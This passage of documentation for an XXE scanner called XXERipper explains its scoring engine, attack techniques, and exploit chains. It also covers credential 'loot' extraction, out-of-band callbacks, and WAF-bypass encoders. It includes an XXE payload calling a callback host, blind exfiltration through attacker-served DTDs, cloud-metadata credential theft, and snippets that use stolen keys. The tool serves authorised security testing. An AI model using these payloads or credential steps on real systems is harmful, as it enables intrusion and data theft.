- **Median elapsed time** and **IQR** — used for timing-anomaly scoring.
- **Mode status code** — used for status-shift scoring.
- **Most-common body hash** — used for the no-change veto.
- **Median Shannon entropy** over the whole body — used as a lower bound sanity check.
- **Median windowed entropy** over 256-byte windows — used for the entropy-anomaly score.
- **Union of all sample bodies** — used for the baseline-anchored parser error check.

Baseline statistics are the anchor. Every subsequent scoring decision compares a candidate response against this baseline, not against a fixed threshold.

### Layer 2 — Vetoes

Vetoes reject obvious noise before scoring. Two are hard, one is soft.

**Reflection veto (hard, −100).** If the response body contains a 40-character substring of the payload (after URL-decoding and whitespace normalization), the payload was echoed verbatim without entity resolution. This is the single most common source of false positives in naive scanners — every "test the XML parser" endpoint that echoes its input would otherwise look vulnerable.

**Soft reflection penalty (−30).** If reflection is detected but the response *also* carries a strong signal (a file fingerprint, a correlated OOB callback, chain integrity, or a high-confidence parser error), the hard veto is downgraded to a −30 penalty. This handles the case where a real file read is embedded inside a page that also happens to echo part of the request.

**No-change veto (hard, −50).** If the response body is byte-identical to the baseline's most common body hash, the payload changed nothing. `strong_signal` downgrades this to a normal score without the veto.

**Normalized baseline match (hard, −75).** Even when the hash differs, the response may be structurally identical after stripping whitespace, hex blobs, long numbers, CSRF tokens, and session IDs. If so, it's baseline noise. Same `strong_signal` gate.

**Entropy anomaly (upward-only).** Only fires when `median_length >= 256`. Whole-response entropy is dominated by surrounding page furniture and misses small embedded high-entropy regions — a file-read result in a large error page. The windowed scan (256-byte windows, 128-byte step, first 16 KiB) catches those. Scales from +5 at 0.5 bits/byte above baseline up to +20 at 4.0 bits/byte above baseline.

### Layer 3 — Positive signals

Each surviving candidate is scored against the baseline:

| Signal | Weight | Baseline anchor |
|---|---|---|
| File content fingerprint | +40, +5 per extra indicator | Indicator must not appear in baseline bodies |
| Chain integrity (entity resolved end-to-end, not just declared) | +25 | Structural — response parses as content, not as markup |
| Parser error (high / medium / low) | +20 / +15 / +5 | Error string must not appear in baseline bodies |
| Timing anomaly confirmed | +20 | Delta ≥1.5s, ratio ≥2.5× median, and either delta ≥4× IQR or delta ≥2× observed jitter |
| Windowed entropy anomaly | +5 to +20 | Upward-only, scaled by bits/byte delta |
| Correlated OOB callback | +50 | Token in callback subdomain matches pending token |
| Uncorrelated OOB callback | +15 | Callback arrived but token didn't match |
| Length delta (≥20%) | +10 | Against median length |
| Status shift | +5 | Against mode status |

File fingerprints require **at least two** indicator strings to match, and the response must not look like markup. This is what prevents a page that mentions `root:x:0:0:` in a documentation snippet from tripping the `/etc/passwd` detector.

### Layer 4 — Classification

| Score | Mandatory signal | Independent families | Result |
|---|---|---|---|
| ≥70 | Yes | ≥2 | **Confirmed** — CRITICAL |
| 45–69 | Yes | any | **Potential** — HIGH |
| 25–44 | Yes | any | **Potential** — MEDIUM |
| <25 | Yes | any | **Theoretical** — LOW *(suppressed)* |
| any | No | any | **Theoretical** — INFO *(suppressed)* |

**Mandatory signals** are limited to three: `file_type` (a file-content fingerprint matched), `oob_correlated` (a crypto-correlated OOB callback arrived), and `chain_integrity` (the entity resolved end-to-end). Parser errors and timing anomalies contribute to score but cannot confirm a finding on their own — a parser error says the payload reached the parser, not that the entity resolved; a timing delta says the target took longer, not that a network fetch occurred.

**Independent families** counts distinct evidence *types*: `file_type`, `oob_correlated`, `chain_integrity`, `parser_error`, `response_elapsed`. The two-family requirement means even at score ≥70, a single strong fingerprint cannot promote to CRITICAL on its own. It needs a second independent signal — a parser error specific to the XXE response, or a timing anomaly, or chain integrity.

### Layer 5 — Trust-building over the scan

Each phase sees a more confident picture of the target than the last. The fingerprint runs first and gates the file-read phases. The file-read phases produce loot, which seeds chain stages. Chain stages complete templates, which produce rollups. The rollups are treated as findings in their own right and appear in every output format.

The result is a scanner that treats "clean" as a state to be verified rather than assumed, and reports coverage at every stage so the operator can tell the difference between "the target is not vulnerable" and "the target was never tested."

### False-positive bait in the lab

The bundled labs ship with seventeen safe endpoints specifically designed to trip a scanner that over-reports. The five baseline baits:

- `/xml/safe` — parses with entities disabled. Correct scanners report `[OK]`.
- `/xml/noise` — returns a random body per request. Baseline normalization catches it.
- `/xml/stripped` — parses XML but strips ENTITY declarations first. A scanner that treats "the parser ran" as a finding will fail here.
- `/xml/silent` — parses but strips the DOCTYPE before parsing. No entity remains. False-negative bait.
- `/xml/safe-metadata` — returns AWS-shaped strings inside HTML. File fingerprint requires two indicators plus non-markup to fire — the response here is markup.

Plus twelve scope-matched safe counterparts (`/xml/safe-form`, `/xml/safe-query`, `/xml/safe-svg`, `/xml/safe-saml`, `/xml/safe-soap`, `/xml/safe-multipart`, `/xml/safe-docx`, `/xml/safe-xinclude`, `/xml/safe-xinclude-xml`, `/xml/safe-xslt`, `/xml/safe-xsd`, `/xml/safe-pi`) that run the same scope check as their vulnerable counterpart but parse with entities disabled. Any finding on any of these seventeen endpoints is a scanner bug.

---

## Accuracy Engine

Weighted scoring with **mandatory signal gates**. Every candidate response is scored against the statistical baseline. This section details the weights and thresholds; the [Detection Methodology](#detection-methodology) section explains the reasoning.

| Signal | Weight |
|---|---|
| Correlated OOB callback | +50 |
| File content fingerprint | +40 (+5 per additional indicator) |
| Chain integrity (entity resolved, not just declared) | +25 |
| Parser error delta (high / medium / low) | +20 / +15 / +5 |
| Timing anomaly confirmed | +20 |
| Windowed entropy anomaly | +5 to +20, scaled by bits/byte delta |
| Uncorrelated OOB callback | +15 |
| Length delta (≥20% deviation) | +10 |
| Status code shift | +5 |
| Reflection penalty (strong signal present) | −30 |
| Reflection veto (no strong signal) | −100 |
| No-change veto | −50 |
| Normalized baseline match | −75 |

**Windowed entropy** uses 256-byte sliding windows (128-byte step, first 16 KiB). Fires only when `median_length >= 256`, only on upward shifts, and only when the delta exceeds 0.5 bits/byte. Scales from +5 at the threshold to +20 at 4.0 bits/byte.

| Score | Mandatory signal | Independent families | Result |
|---|---|---|---|
| ≥70 | Yes | ≥2 | **Confirmed** — CRITICAL |
| 45–69 | Yes | any | **Potential** — HIGH |
| 25–44 | Yes | any | **Potential** — MEDIUM |
| <25 | Yes | any | **Theoretical** — LOW *(suppressed)* |
| any | No | any | **Theoretical** — INFO *(suppressed)* |

**Timing findings are always `potential`, not `confirmed`** — a timing delta says the target took longer, not that an entity was resolved.

### CWE mapping

Longest-prefix-first lookup. XXE findings carry CWE-611; information-disclosure findings add CWE-200; SSRF-via-entity, the XSLT/XSD fetchers, and every `XXE-CLOUD-METADATA-*` finding add CWE-918; PHP `expect://` and the `XXE-RCE-*` wrappers add CWE-78; Billion Laughs is CWE-776; error-based local-DTD reuse adds CWE-829; `XXE-SAML-PRESIG` adds CWE-347; `XXE-WAF-BYPASS-*` adds CWE-693; the YAML deserialization phase adds CWE-502.

---

## Attack Techniques

Thirty-plus families across ten classes.

| Class | Techniques | Severity | CWE |
|---|---|---|---|
| In-band | Classic file read, PHP filter chain, SSRF via entity | CRITICAL | 611, 200, 918 |
| In-band RCE | PHP `expect://` | CRITICAL | 611, 78 |
| Error-based | Local DTD reuse, Malformed entity | CRITICAL | 611, 200, 829 |
| Blind | DNS OOB, External DTD OOB, Parameter-entity OOB, CDATA bypass, Timing-based | CRITICAL / HIGH | 611 |
| Encoding bypass | UTF-16, UTF-7, UCS-4, alternate DOCTYPE | HIGH | 611 |
| Alternative sinks | XInclude (`parse='text'`, `parse='xml'`), SVG upload, SAML envelope, SOAP envelope | CRITICAL | 611, 918 |
| Extended fetchers | XSLT `document()`, XSLT `xsl:include`, XSD `schemaLocation`, XSD `xsd:import`, `xml-stylesheet` PI, Multipart XML field, DOCX upload | HIGH / CRITICAL | 611, 918 |
| Cloud metadata | AWS IMDSv1, AWS IMDSv2 (detected), AWS IAM credentials, AWS user-data, GCP token/project, Azure IMDS/managed-identity, Alibaba RAM, OCI, Kubernetes secrets | CRITICAL / HIGH | 611, 918, 200 |
| RCE wrappers | Java `jar:`, PHP `data://`, PHP `phar://`, PHP `glob://`, PHP `compress.zlib://` | CRITICAL | 611, 78, 200 |
| SAML pre-signature | Assertion body parsed before signature verification | HIGH | 611, 347 |
| JSON-to-XML | Content-type switching on JSON-only endpoints | HIGH | 611, 200 |
| Office document | DOCX/XLSX `xml-stylesheet` PI fetched by server-side XSLT processors | CRITICAL | 611, 918 |
| YAML deserialization | PyYAML `!!python/object/apply`, SnakeYAML `!!javax.script.ScriptEngineManager` | CRITICAL | 502, 611 |
| DoS | Billion Laughs | HIGH | 776 |

**Delivery-vector phases** probe beyond the standard `POST` + `application/xml` shape:

- **Content-Type matrix** — the classic payload under nine XML-adjacent content types. Many servers only route to their XML parser when the Content-Type matches.
- **HTTP method variation** — `PUT` and `PATCH`. REST APIs frequently accept XML on those methods even when `POST` is JSON-only.
- **Query-parameter injection** — `?xml=`, `?data=`, `?payload=`, `?input=`. Legacy APIs and gateways often accept XML this way even when the body is not parsed as XML.
- **JSON-to-XML switching** — a benign XML probe determines whether the endpoint accepts `application/xml` alongside its advertised JSON. If not hard-rejected with `415`, the scanner follows up with a classic file-read payload. This catches Spring MVC with `jackson-dataformat-xml` on the classpath (which silently accepts XML on any `@RequestBody` endpoint, no annotation needed).

**Cloud metadata** is a dedicated phase, not just an entry in a URL list. Eleven endpoints across six providers are probed. Each is fingerprinted against provider-specific keys (`AccessKeyId`, `SecretAccessKey`, `SecurityToken` for AWS IAM; `access_token`, `expires_in`, `token_type` for GCP OAuth; `vmId`, `subscriptionId` for Azure; etc.). A response containing credential markers is promoted to CRITICAL and probed no further. **IMDSv2 detection**: an AWS response with status `401` and `token` in the body is reported as `XXE-CLOUD-METADATA-IMDSV2` (HIGH) — the SSRF primitive exists but the metadata service enforces a session token. Extracted credentials route through `LootStore.add_secret` and land in the WebUI's Loot tab with paste-ready snippets.

**XXE-to-RCE wrappers** are probed for their characteristic success signals:

| Wrapper | Signal |
|---|---|
| Java `jar:file://…!/META-INF/MANIFEST.MF` | `Manifest-Version`, `Main-Class` |
| PHP `data://text/plain;base64,…` | `phpinfo`, `<?php` |
| PHP `phar://…/stub` | `unserialize`, `__PHP_Incomplete_Class` |
| PHP `glob:///etc/*` | Path listings (`/etc/`, `/root/`, `/usr/`) |
| PHP `compress.zlib://…` | `root:x:`, `daemon:x:` |

**SAML pre-signature** — SAML service providers must parse the assertion body before verifying the signature, the sequence that CVE-2026-28809 (esaml) exposed. The phase sends a well-formed SAML assertion with a deliberately invalid signature first; a parser error or a `200` signals that the endpoint reached XML parsing. Only then is the XXE payload sent. Runs automatically on SAML-shaped URLs (`saml`, `sso`, `adfs`, `okta`, `assertion`, `federation`, `idp`, `sts/`, `sp/`), or unconditionally with `--saml`.

**Office-document XSLT** — the `xml-stylesheet` PI is honoured by server-side document processors in some configurations: Word preview renderers, PDF converters, LibreOffice headless, and Apache POI XSLF. The phase builds a minimal DOCX (or XLSX) whose `word/document.xml` (or `xl/workbook.xml`) part carries the PI pointing at an attacker-controlled XSLT. A correlated callback proves the stylesheet was fetched. Distinct from XXE in the strict sense — it is XSLT invocation, which chains to file disclosure (`document('file:///etc/passwd')`) and SSRF.

**YAML deserialization** — CWE-502, not CWE-611. The scanner ships four probes: PyYAML `!!python/object/apply:os.system` and SnakeYAML `!!javax.script.ScriptEngineManager`, each delivered both as a raw `application/x-yaml` body and inside an XML wrapper. A correlated callback proves RCE. The phase stops after the first success; the alternate variants would be noise.

**File-target phases** — 21-path priority set by default; `--full-file-scan` expands to 58 paths, adding Linux `/proc` walks, application source and `.env` files, SSH/AWS/GCP credential paths, container markers, `/run/secrets/*`, the Kubernetes service-account projection, and Windows SAM backups, unattend files, IIS logs, and administrator credentials. Deduplicated at scan time; no path is probed twice.

**Error-based findings are split** because the techniques succeed against different parsers:

- `XXE-ERROR-BASED-LOCAL-DTD` — hijacks a DTD that already exists on the target filesystem. Uses the external-DOCTYPE form accepted by libxml2 ≥2.9.
- `XXE-ERROR-BASED-MALFORMED` — declares a parameter entity inside the internal subset and lets the parser error leak the file. Works on Xerces and .NET; libxml2 rejects internal-subset PEs at the C level.

**Timing probes** point the entity at an RFC 5737 TEST-NET-1 address (`http://192.0.2.1/`), which is guaranteed non-routable. Entity resolution blocks on the resolver's TCP connect timeout.

**Opt-in phases:** `--timing` (holds three ~5s connections per target), `--unsafe` (Billion Laughs), `--svg` (upload-shaped phases), `--saml` (SAML pre-signature), `--full-file-scan` (extended file list), `--bypass-waf` (see below).

---

## Exploit Chains and Loot Extraction

Two subsystems turn individual findings into narrative.

### Chain tracker

Every finding that passes `add_finding` seeds chain stages through a single hook: `_record_chain_stages` reads the finding's ID and evidence dict and records whatever stages the combination implies. A finding with a `file_type` evidence key records `xxe_confirmed`. A finding with a `loot_id` records `file_content_recovered`. A finding whose evidence contains `extracted_credentials` records `credential_extracted`; if the credential is an SSH private key, `ssh_key_extracted` also fires. And so on.

Thirteen chain templates are defined. Each requires a set of stages. When all required stages are present, the chain fires **once** (guarded against concurrency races) and emits a rollup finding:

| Chain ID | Path | Severity |
|---|---|---|
| `xxe_inband_file_credential_theft` | XXE → in-band file read → credential theft | CRITICAL |
| `xxe_imds_iam_aws_takeover` | XXE → IMDS → IAM credentials → AWS account takeover | CRITICAL |
| `xxe_error_based_file_recovery` | XXE → error-based leak → file content recovered | HIGH |
| `xxe_php_source_disclosure` | XXE → PHP filter → source disclosure | CRITICAL |
| `xxe_rce_chain` | XXE → protocol wrapper → RCE chain confirmed | CRITICAL |
| `xxe_blind_oob_confirmed` | XXE → blind OOB callback confirmed | HIGH |
| `xxe_ssrf_internal_enum` | XXE → SSRF → internal service reached | HIGH |
| `xxe_waf_bypass_confirmed` | XXE → WAF bypass → entity resolution confirmed | HIGH |
| `xxe_kubernetes_cluster_takeover` | XXE → Kubernetes secrets API → cluster credential theft | CRITICAL |
| `xxe_k8s_serviceaccount_token` | XXE → in-cluster SA token read | CRITICAL |
| `xxe_ssh_key_lateral_movement` | XXE → SSH private key → lateral movement primitive | HIGH |
| `xxe_gcp_oauth_token_extraction` | XXE → GCP metadata → OAuth token extraction | CRITICAL |
| `xxe_azure_managed_identity` | XXE → Azure IMDS → managed-identity token | CRITICAL |

Rollup findings carry a JSON-serializable step trace, an aggregate score of 100, and a full-length reason chain. They appear in JSON, SARIF, and HTML output like any other finding, and their ID prefix (`XXE-CHAIN-`) is excluded from chain seeding so they never loop.

### Loot store

Every file-read finding routes through `LootStore`, which:

1. Extracts the raw file content from the response body via `FileContentExtractor`. The extractor dispatches by `(file_path, fingerprint_type)`: `/etc/passwd` and `/etc/shadow` have line-oriented matchers with mid-line fallback for parser errors that leak a path prefix; SSH keys use PEM boundaries; `.env`, `web.ini`, `system.ini`, `boot.ini` have INI-style matchers; `web.config` uses a configuration-element matcher; `/proc/self/environ` handles NUL-delimited bodies. A generic fallback pulls `<pre>` / `<textarea>` / `<code>` blocks out of markup responses.
2. Truncates to 256 KB (credentials are extracted from the full content before truncation).
3. Deduplicates by SHA-256 of the content.
4. Runs `CredentialExtractor` over the full content.

`CredentialExtractor` recognizes seven credential kinds:

| Kind | Source | Confidence |
|---|---|---|
| `aws_iam` (JSON) | AWS IMDS `AccessKeyId` / `SecretAccessKey` / `Token` | 95 |
| `aws_iam` (INI) | AWS CLI credentials file (`aws_access_key_id` / `aws_secret_access_key` / `aws_session_token`) | 90 |
| `alibaba_ram` | Alibaba Cloud metadata (`AccessKeyId` / `AccessKeySecret` / `SecurityToken`) | 90 |
| `ssh_private_key` | PEM private key blocks (RSA, OpenSSH, DSA, EC, PKCS#8) | 90 |
| `gcp_service_account` | Service-account JSON (`"type": "service_account"` + `private_key_id`) | 85 |
| `oauth_token` | GCP metadata and Azure managed-identity response (`access_token` + `expires_in` / `expires_on`) | 85 |
| `k8s_sa_token` | Kubernetes `SecretList` (`data.token` base64-JWT) or a bare service-account token file | 90 |
| `generic_bearer` | Any `Bearer <token>` or `Authorization: <token>` match with a 24+ character token | 40 |

Each credential produces a list of paste-ready shell snippets:

- **AWS IAM** — `aws sts get-caller-identity` to verify the key still works, `aws s3 ls`, IAM policy enumeration, and an `export` block for the current shell.
- **Alibaba RAM** — `aliyun sts GetCallerIdentity`, `aliyun oss ls`, and an `export` block with the correct `ALIBABA_CLOUD_*` environment variables.
- **SSH private key** — install, fingerprint, and try against `github.com` / `gitlab.com` / `bitbucket.org`.
- **GCP service account** — activate the key with `gcloud auth activate-service-account`.
- **OAuth access token** — `curl` against Google's userinfo endpoint (works for GCP tokens) and Azure's subscriptions endpoint (works for Azure tokens).
- **Kubernetes service-account token** — `kubectl --token=…` snippets built with the namespace and service-account name decoded from the JWT's claims, plus a `jq` command to inspect the token's claims without verifying the signature.
- **Generic bearer** — `curl` against `httpbin.org/bearer` to test whether the token is still live.

Extracted credentials are attached both to the finding's evidence (`extracted_credentials`) and to the loot entry (`credentials`). The WebUI's **Loot** tab and the Inspector's **Overview** tab render them inline with per-command copy buttons. The HTML report includes them under the *Extracted loot* section.

The full credential value appears in the Loot preview. Masking was removed in v1.0.0 because the same value is already visible unmasked in the Inspector, the JSON output, the SARIF output, and the HTML report — masking in one place and not the others served no purpose.

### Loot routing across techniques

Loot extraction runs on every finding whose response body contains parseable file content:

- **In-band file reads** — `/etc/passwd`, `/etc/shadow`, SSH keys, `.env`, etc. Extracted directly from the response.
- **Error-based leaks** — the file content is embedded in the parser error text. The mid-line `/etc/passwd` matcher catches it.
- **PHP filter output** — base64-decoded before extraction, then routed through the credential extractor.
- **XInclude resolves** — the inlined content is parsed by the same extractor.
- **Cloud metadata responses** — credentials are extracted and routed through `LootStore.add_secret`, and the resulting loot IDs are attached to the finding's evidence as `loot_ids`.
- **Blind OOB exfiltration** — when `--oob-listen` or `--oob-dtd-dir` is active (or the WebUI-hosted DTD server), the callback carries file content, `OOBExfilExtractor` pulls it out, and the result goes through the same file-content and credential extractors as an in-band read.

The blind-exfiltration path is the one that changes what the tool is. Before it, `XXE-BLIND-OOB-EXTERNAL-DTD-CORRELATED` said "the target fetched our DTD." After it, the same finding carries `loot_id`, `extracted_content_preview`, and `extracted_credentials` in its evidence, the chain tracker sees the loot and can fire `xxe_blind_oob_confirmed` → `file_content_recovered` → `credential_extracted`, and the WebUI Loot tab renders the recovered file with the same paste-ready snippets as an in-band read.

---

## Out-of-Band Confirmation

XXERipper uses **`interactsh-client`** as the OOB backend. There are two modes.

### Manual mode (default)

The scanner builds payloads under your session domain; the client does the registration, polling, and decryption. The scanner never speaks the Interactsh protocol.

```bash
# Terminal A
interactsh-client -v
# [INF] c5f2a9b4e1d8a3f72c0b.oast.pro

# Terminal B
xxeripper https://target.com/api/xml \
    --oob-domain c5f2a9b4e1d8a3f72c0b.oast.pro
```

When the scan finishes, each target's summary includes an `[OOB]` block listing every payload sent, grouped with its technique label:

```
[1/1] [MANUAL-OOB] https://target.com/api/xml
  Parser: libxml2
  [!] 3 phase(s) skipped:
        - multipart_docx, svg  (no --svg and no upload-shaped URL)
        - dos  (no --unsafe)
  [OOB] 7 payload(s) dispatched — watch your interactsh-client terminal
      - [xxe-dns] xxe-dns-a1b2c3d4e5f6a7b8.c5f2a9b4e1d8a3f72c0b.oast.pro
        DNS-only parameter entity (blind parser fingerprint)
      - [xxe-dtd] xxe-dtd-9f8e7d6c5b4a3210.c5f2a9b4e1d8a3f72c0b.oast.pro
        External DTD fetch (blind file exfiltration via DTD)
      ...
```

When `interactsh-client` prints an interaction, match the subdomain prefix back to the corresponding `[OOB]` line. That match is your confirmation.

**Manual mode does not extract exfiltration.** In manual mode, the scanner dispatches OOB payloads and returns immediately — it never reads interactsh's output. The exfiltrated content is visible in your interactsh terminal, not in the scanner's loot store. Both the CLI banner and the WebUI job runner print a warning when exfiltration is configured but auto mode is off.

### Auto mode (`--oob-auto`)

The scanner spawns `interactsh-client` as a subprocess, reads its `-json -v` event stream, extracts the session domain, and correlates callbacks in-process. No second terminal, no manual matching.

```bash
xxeripper https://target.com/api/xml --oob-auto
# [*] Starting interactsh-client (--oob-auto)...
# [*] Session domain: c5f2a9b4e1d8a3f72c0b.oast.pro
# [*] Callbacks will be correlated automatically.
```

Callbacks are printed to stderr the moment they arrive:

```
  [OOB-CALLBACK] dns xxe-dtd-9f8e7d6c5b4a3210 from 203.0.113.42
```

Correlation is token-based. The scanner generates a unique 16-hex token per payload, embeds it in the subdomain, records the mapping, and matches incoming callbacks by token. A callback whose subdomain does not contain the specific pending token for the payload that generated the subdomain is discarded, so unrelated DNS traffic cannot be misattributed and a slow callback for iteration *N* cannot be attributed to iteration *N+1*. A correlated callback carries the full +50 weight and contributes a mandatory signal — it can promote a finding to CRITICAL on its own (with the two-family requirement satisfied by the OOB family plus chain integrity or a fingerprint).

**Batch scans** share one `interactsh-client` process for the lifetime of the run. Each target gets its own `OOBClient` view with its own token set, so per-target attribution stays correct even with `--threads 20`.

**In the web console**, ticking *Auto OOB mode* spawns one shared `interactsh-client` for the lifetime of the server process, spawned lazily on the first auto-OOB job and reused thereafter. Multiple concurrent jobs share the domain but keep independent token sets.

### Blind exfiltration

By default, an OOB finding confirms that entity resolution occurred — the callback arrived, and the token proves it was ours. It does not recover file content. To recover content, the scanner needs to serve the DTD that causes the target to send its file into the callback URL.

Three DTD-hosting modes are supported:

**Built-in DTD server** (`--oob-listen HOST:PORT --oob-public-url URL`): the scanner binds its own HTTP server and serves DTDs on demand. Best for test labs, same-host scans, and any environment where the target can reach the scanner's address.

**File-based DTD serving** (`--oob-dtd-dir PATH --oob-dtd-url-prefix URL`): the scanner writes DTD files to a directory; you serve that directory with nginx, Apache, `python -m http.server`, or anything else. Best for real remote targets where the scanner's own address isn't reachable.

**WebUI-hosted DTD server**: tick **Serve DTDs from this WebUI** in the new-scan drawer and supply the public URL prefix. The scanner registers DTDs at `/dtd/<token>.dtd` on the same Flask process that runs the console. No second terminal, no `python -m http.server`, no separate directory. The user must ensure the target can reach the WebUI's bind address — bind with `--host 0.0.0.0` and supply the public IP or hostname.

When exfiltration is active, `XXE-BLIND-OOB-EXTERNAL-DTD-CORRELATED` and `XXE-CDATA-BYPASS-OOB` findings carry extracted file content as loot. The same `FileContentExtractor` and `CredentialExtractor` pipeline that runs on in-band reads runs on the exfiltrated bytes, so a blind `/etc/passwd` read produces the same credential extraction and paste-ready shell snippets as an in-band one. Exfiltrated content appears in the WebUI **Loot** tab, in the OOB tab's `exfiltrated` block, and in the HTML report's loot section.

**Prerequisite.** The target must be able to reach your DTD server. Interactsh logs callbacks but does not serve content, so it cannot stand in for a real HTTP endpoint. This is inherent to how blind XXE exfiltration works, not a limitation of the scanner.

**Manual mode does not exfiltrate.** Exfiltration requires the scanner to read its own callback stream, which only happens in `--oob-auto` mode. If you run manual mode with `--oob-listen` or `--oob-dtd-dir`, the DTDs will be served, the target will fetch them, the target will send the file content to interactsh — but the scanner will not extract it, because it never reads interactsh's output. The exfiltrated data is visible in your interactsh terminal.

### When to use which

- **Manual** is the safer default. No subprocess, no crypto handshake, and it works with any Interactsh deployment including fully air-gapped coordination where the client is run on a different host.
- **Auto** is faster for batch scans and CI. One command, no cross-referencing. Requires `interactsh-client` in `PATH`. Required for exfiltration.

**Self-hosted servers** work in both modes without any scanner-side change — point `interactsh-client` at your server (via its `-s` / `-server` flag, or by wrapping the binary in a shell alias) and, in manual mode, pass the printed session domain to `--oob-domain`.

---

## WAF Bypass Encoding

`--bypass-waf` re-sends the entire payload catalogue through one or more encoders *after* the core phases run. This tests whether a WAF is blocking the classic payload shapes but letting a transformed equivalent through — but it does so without hiding the direct findings behind the encoded sweep.

Fifteen encoders across three families:

**Document encoders** (transform the byte stream):

| Name | Transform | Notes |
|---|---|---|
| `utf16be` | UTF-16 BE with BOM | Classic byte-stream shift. Most WAFs decode bodies as UTF-8 and miss the interleaved nulls. |
| `utf16le` | UTF-16 LE with BOM | Same principle, opposite endianness. |
| `utf16decl` | UTF-16 BE with BOM and rewritten declaration | The declaration is updated to `encoding="UTF-16"` so strict parsers accept it. |
| `utf16nobom` | UTF-16 BE without BOM, declaration rewritten | Some parsers honour the declaration and infer endianness; some WAFs use the BOM as a decode signal and skip a body that lacks it. |
| `utf32be` | UTF-32 BE with BOM | Less commonly supported by WAFs than UTF-16. |
| `utf32le` | UTF-32 LE with BOM | Same, opposite endianness. |
| `ebcdic` | EBCDIC CP037 | Almost no WAF decodes EBCDIC before inspection. libxml2 auto-detects it; Xerces and .NET refuse it cleanly. |
| `ucs4_2143` | UCS-4 byte order 2,1,4,3 | Unicode TR#17 permutation. The byte pattern matches no UTF-32 BE/LE signature, so WAFs don't decode it. Same order that bypassed PhpSpreadsheet's XmlScanner in CVE-2024-47873. |
| `utf8bom` | UTF-8 with BOM | Marginal but free. Defeats regexes anchored at `^<?xml`. |

**Keyword-evasion encoders** (transform the entity declaration):

| Name | Transform | Notes |
|---|---|---|
| `public` | `SYSTEM "…"` → `PUBLIC "-//x//" "…"` | Valid XML. WAFs that only match `SYSTEM "file://` miss it. |
| `public_charref` | `SYSTEM` keyword → hex character references inside a `PUBLIC` declaration | Character references are expanded inside `PubidLiteral` but not inside `SystemLiteral`. The parser reassembles `SYSTEM` as the public ID; a WAF matching the literal string misses it. |
| `b64_uri` | `SYSTEM "file://…"` → `data:text/plain;base64,…` | Bypass probe, not a file-read primitive — the entity resolves to the URI *string*, not the file contents. Use it to confirm the WAF can be defeated; combine with an application-level sink for extraction. |

**Grammar-level encoders** (valid XML, defeat lazy WAFs):

| Name | Transform | Notes |
|---|---|---|
| `whitespace_pad` | 512 spaces inserted in the XML declaration | XML permits arbitrary whitespace between declaration pseudo-attributes. WAFs that inspect only the first N bytes of the body see a padded declaration and never reach the DOCTYPE. |
| `doctype_closure` | Decoy comment after `]>` | Some WAFs parse the DOCTYPE to locate its end, then inspect the remainder. Inserting an XML comment after `]>` can mislead that parser into an early exit that skips the entity declarations. The XML parser ignores the comment. |
| `pe_stager` | Entity declaration rewritten as a parameter-entity chain | WAFs see `<!ENTITY % stage "…"` and `%stage;` but never the `SYSTEM "file://…"` URI in a single declaration. The parser expands `%stage`, which declares the real entity. Works on any parser that permits internal-subset parameter entities — Xerces and .NET out of the box; libxml2 only if the internal-PE restriction has been lifted at build time. |

Encoders whose output is byte-identical to the input on a given payload are skipped (no request sent). A finding is raised per surviving (payload × encoder) combination as `XXE-WAF-BYPASS-<ENCODER>` (or `XXE-WAF-BYPASS-<ENCODER>-<PAYLOAD>` for OOB families), or, for OOB families, only when a correlated callback arrives.

```bash
# All encoders
xxeripper https://target.com/api/xml --bypass-waf all --oob-auto

# A targeted subset — the five highest-yield encoders
xxeripper https://target.com/api/xml \
    --bypass-waf utf16be,ucs4_2143,public_charref,whitespace_pad,b64_uri \
    --oob-auto

# Also encode custom payloads (skips those using {CALLBACK} / {DOMAIN})
xxeripper https://target.com/api/xml \
    --bypass-waf utf16be,ebcdic --bypass-waf-include-custom
```

**Phase ordering.** The WAF bypass phase runs **after** the core phases, not before. A target that responds to a plain `SYSTEM "file://"` payload does not need to be sent 1,500 encoded variants first — the direct probes find it in ~20 requests, and the encoded sweep is the fallback for when they were blocked. The phase still uses the same catalogue, still produces the same findings, and still runs when `--bypass-waf` is set; it just doesn't hide direct hits behind the sweep.

**Request volume.** A catalogue of ~100 payloads × 15 encoders is ~1,500 requests per target in the worst case. The wall-clock budget is the only throttle; the phase checks the deadline before every send and aborts cleanly. For large targets, prefer a named encoder subset over `--bypass-waf all`.

---

## Custom Payloads

```bash
# Inline
xxeripper https://target.com/api/xml \
    --payload '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % p SYSTEM "http://{CALLBACK}/x">%p;]><r/>' \
    --oob-domain c5f2a9b4e1d8a3f72c0b.oast.pro

# Payload file (separate multiple payloads with a `---` line)
xxeripper https://target.com/api/xml --payload-file my_payloads.xml

# Payload directory
xxeripper https://target.com/api/xml --payload-dir ./custom_xxe/
```

Each file is tested against every file target. Findings are attributed as `XXE-CUSTOM-<filename>`. Custom payloads route through the same OOB helper as built-in phases, so their subdomains and technique labels appear in the `[OOB]` checklist (manual mode) or trigger correlated callbacks (auto mode).

**Cookies and Burp integration:** cookie priority is inline > cookie file > Burp request. Both Netscape-jar and `key=value` formats are supported. Burp requests preserve method and end-to-end headers; hop-by-hop headers and scanner-managed `Cookie`/`Content-Type` are not forwarded. Scheme is derived from the `Host` header, the HTTP version line, and any `X-Forwarded-Proto` / `Forwarded` / `:scheme` header the request carries. 443/8443/9443/10443/6443/7443/4443 → HTTPS; 80/8000/8008/8080/8088/8888 → HTTP; unknown ports and HTTP/2 requests → HTTPS by default. IPv6 hosts are parsed correctly.

**Pre-auth replay:** `--pre-auth-request FILE` takes a Burp-format request, replays it once against the target before the baseline capture, and merges any `Set-Cookie` headers into the jar. Repeating the flag replays multiple requests in order, so a two-step flow (CSRF token fetch, then credentials POST) works. Each replay's cookies are available to the next request in the sequence.

**WAF bypass with customs:** `--bypass-waf-include-custom` extends the encoder sweep to user payloads. Customs referencing `{CALLBACK}` or `{DOMAIN}` are skipped (an encoded OOB payload cannot be correlated through a placeholder).

---

## Output Formats

### JSON (schema 1.1)

```json
{
    "schema_version": "1.1",
    "tool": "XXE-Ripper",
    "summary": { "targets": 1, "vulnerable_targets": 1, "custom_payloads_loaded": 0 },
    "results": [{
        "url": "https://target.com/api/xml",
        "parser_fingerprint": "libxml2",
        "findings": [{
            "id": "XXE-INBAND-FILE-READ-linux-passwd",
            "severity": "CRITICAL",
            "title": "In-band XXE file read: /etc/passwd",
            "confirmed": true,
            "exploitability": "confirmed",
            "cwe": ["CWE-611", "CWE-200"],
            "cwe_descriptions": ["...", "..."],
            "confidence": 85,
            "evidence": {
                "file_type": "/etc/passwd",
                "indicators_matched": 4,
                "score": 85,
                "loot_id": "file:9a1c...",
                "extracted_content_preview": "root:x:0:0:root:/root:/bin/bash\n..."
